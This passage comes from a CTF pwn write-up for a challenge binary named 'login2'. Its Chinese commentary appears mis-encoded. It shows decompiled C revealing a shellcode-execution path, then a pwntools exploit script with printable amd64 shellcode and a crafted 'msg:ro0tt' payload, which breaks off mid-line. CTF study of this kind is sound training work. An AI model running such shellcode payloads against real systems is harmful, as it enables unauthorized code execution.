class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( dest )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">  &#125;</span><br><span class="line">  *ptr = <span class="number">0</span>;</span><br><span class="line">  sa = (<span class="type">char</span> *)(ptr + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *sa == <span class="number">10</span> )</span><br><span class="line">    *sa = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      sub_DA8(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      sub_EFE(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      sub_CBD(dest);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">6</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸€ä¸²ä»£ç çœ‹ç€è®©äººæ€€ç–‘äººç”Ÿï¼Œå› æ­¤åˆ†æ®µåˆ†æï¼Œä¸»è¦åˆ†ä¸º3éƒ¨åˆ†ï¼Œ1ï¼šåˆå§‹åŒ–ï¼Œ2ï¼šåˆ¤æ–­å­—ç¬¦ä¸²æ ¼å¼å¹¶å°†ç›¸åº”ä½ç½®çš„å€¼ä¼ è¿›å»ï¼Œ3ï¼šä¾¿æ˜¯switchï¼ŒåŠŸèƒ½å‡½æ•°</p><h3 id="åˆ¤æ–­å­—ç¬¦ä¸²æ ¼å¼"><a href="#åˆ¤æ–­å­—ç¬¦ä¸²æ ¼å¼" class="headerlink" title="åˆ¤æ–­å­—ç¬¦ä¸²æ ¼å¼"></a>åˆ¤æ–­å­—ç¬¦ä¸²æ ¼å¼</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( !*ptr || *ptr != <span class="string">&#x27;\n&#x27;</span> &amp;&amp; (*ptr != <span class="string">&#x27;\r&#x27;</span> || ptr[<span class="number">1</span>] != <span class="string">&#x27;\n&#x27;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">        qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sb )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sb = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// æ‰¾åˆ°ï¼šä¹‹åçš„æ•°æ®</span></span><br><span class="line">        *sc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*sc )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">        qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">    sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !sd )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *sd = <span class="number">0</span>;</span><br><span class="line">    ptr = sd + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">        *ptr++ = <span class="number">0</span>;</span><br><span class="line">    ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">    nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v7 = atoi(nptr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> ( dest )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">    &#125;</span><br><span class="line">    ++v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªåˆ¤æ–­å°±å å¤§éƒ¨åˆ†çš„ä»£ç æ®µï¼Œå»ºè®®æ”¾åœ¨é€†å‘é‡Œï¼ˆbushi</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )    <span class="comment">//åˆ¤æ–­æ¬¡æ•°å³éå†æ¬¡æ•°</span></span><br><span class="line">    qword_202040[<span class="number">2</span> * v8] = ptr;</span><br><span class="line">sb = <span class="built_in">strchr</span>(ptr, <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !sb )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">*sb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( sc = sb + <span class="number">1</span>; *sc &amp;&amp; (*sc == <span class="string">&#x27; &#x27;</span> || *sc == <span class="string">&#x27;\r&#x27;</span> || *sc == <span class="string">&#x27;\n&#x27;</span> || *sc == <span class="string">&#x27;\t&#x27;</span>); ++sc )<span class="comment">// æ‰¾åˆ°ï¼šä¹‹åçš„æ•°æ®</span></span><br><span class="line">    *sc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> ( !*sc )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;abort.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )</span><br><span class="line">    qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>] = sc;</span><br><span class="line">sd = <span class="built_in">strchr</span>(sc, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !sd )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line">*sd = <span class="number">0</span>;</span><br><span class="line">ptr = sd + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( *ptr == <span class="string">&#x27;\r&#x27;</span> )</span><br><span class="line">    *ptr++ = <span class="number">0</span>;</span><br><span class="line">ptr2 = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8];</span><br><span class="line">nptr = (<span class="type">char</span> *)qword_202040[<span class="number">2</span> * v8 + <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>é¦–å…ˆqword_202040æ•°ç»„çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¼ è¿›æ¥çš„å­—ç¬¦ä¸²çš„å¼€å¤´ï¼Œç„¶åsbä¾¿æ˜¯å­—ç¬¦ä¸²ä¸­<code>ï¼š</code>çš„ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œä¹‹åscå°±æ˜¯sbä¹‹åçš„æ­£å¸¸çš„å¯è¯»å­—ç¬¦ï¼Œç„¶åqword_202040çš„ç¬¬äºŒä¸ªå‚æ•°å°±æ˜¯scï¼Œå³<code>ï¼š</code>åçš„å¯è¯»å­—ç¬¦ï¼Œç„¶åå†æ‰¾åˆ°scä¹‹åå³ï¼šåé¢çš„ä¸€ä¸ª<code>\n</code>ï¼Œå­˜è¿›sdé‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !strcasecmp(ptr2, <span class="string">&quot;opt&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( v7 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = atoi(nptr);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( strcasecmp(ptr2, <span class="string">&quot;msg&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strlen</span>(nptr) &lt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v9 = <span class="built_in">strlen</span>(nptr) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( dest )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    dest = <span class="built_in">calloc</span>(v9 + <span class="number">8</span>, <span class="number">1uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v9 &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">5</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, nptr, v9);</span><br><span class="line">&#125;</span><br><span class="line">++v8;</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±æ˜¯åˆ¤æ–­å­—ç¬¦ä¸²çš„å¼€å¤´å¿…é¡»æ˜¯msgæˆ–è€…optç„¶åè·Ÿä¸Š<code>ï¼š</code>ï¼Œ<code>ï¼š</code>ä¹‹åå°±æ˜¯destæˆ–v7çš„å€¼</p><p>ä»è€Œå¾—çŸ¥æ ¼å¼è¦æ±‚ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">opt:v7\nmsg:dest\n  æˆ–è€…msg:dest\nopt:v7\n</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_DA8</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-2Ch]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202028 != <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( unk_202024 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getpagesize();</span><br><span class="line">    dest = (<span class="type">void</span> *)(<span class="type">int</span>)mmap((<span class="type">char</span> *)&amp;loc_FFE + <span class="number">2</span>, v1, <span class="number">7</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, v2);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))dest)();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¦æ±‚æ˜¯unk_202024è¿™ä¸ªä¸Šé¢çš„å€¼è¦ä¸ºçœŸï¼Œè¿›è€Œä¼šæ‰§è¡Œdestä¸Šçš„å‡½æ•°ï¼Œä¹‹å‰çš„mmapæ˜¯ä¸ºäº†è®©æ‰§è¡Œæ®µå¯æ‰§è¡Œï¼Œæ˜ å°„åˆ°å†…å­˜é‡Œï¼Œä¸ç„¶ä¸€ç›´éƒ½åœ¨æ ˆä¸Šæ˜¾ç„¶æ˜¯ä¸å¯ä»¥æ‰§è¡Œçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_CBD</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">isprint</span>(a1[i]) &amp;&amp; a1[i] != <span class="number">10</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;oh!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(a1, <span class="string">&quot;ro0t&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">    unk_202024 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    unk_202028 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶è¦å…ˆä¼ è¿›å»ro0tä½†æ˜¯å®ƒä¸Šé¢ä¼ è¾“çš„å­—èŠ‚å…¶å®æ˜¯å°‘ä¼ ä¸€ä¸ªå­—èŠ‚å› æ­¤è¦å¤šä¼ ä¸€ä¸ªæ— ç”¨å­—èŠ‚</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">path=<span class="string">&#x27;./login2&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">amd64shell=<span class="string">b&quot;RRYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXAA&quot;</span></span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28735</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;msg:ro0tt\nopt:1\n&#x27;</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span 